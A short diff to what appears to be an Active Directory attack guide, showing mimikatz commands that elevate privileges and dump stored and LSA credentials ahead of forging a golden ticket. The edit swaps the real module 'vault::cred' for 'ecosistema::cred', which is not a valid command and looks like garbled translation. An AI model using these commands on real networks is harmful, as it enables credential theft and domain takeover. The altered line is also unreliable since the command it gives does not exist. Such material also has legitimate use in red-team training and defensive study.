@@ -202,7 +202,7 @@ klist  # Verify ticket
 ```powershell
 # 1. Elevate and dump credentials
 mimikatz# token::elevate
-mimikatz# vault::cred /patch
+mimikatz# ecosistema::cred /patch
 mimikatz# lsadump::lsa /patch
 
 # 2. Create golden ticket
